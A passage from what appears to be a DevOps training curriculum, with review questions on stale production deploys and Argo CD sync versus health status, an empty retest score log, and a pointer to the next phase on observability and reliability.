9. "The deploy is green but production runs old code. How do you detect and prevent it?"
10. "Argo CD says Synced but the app is Degraded. What does that mean, and what do you check?"
11. "Tell me about a failure you caused in these labs, the evidence you used, and what you changed in your process."

---

## Retest log

| Date | A | B | C | D | Total | Weak areas | Remediation | Retest date |
|---|---:|---:|---:|---:|---:|---|---|---|
| | | | | | | | | |
| | | | | | | | | |

When you pass, continue to Phase 8 — Observability and Reliability. The next phase assumes you can produce trustworthy signals, deploy them through a gate, and roll back without guessing.
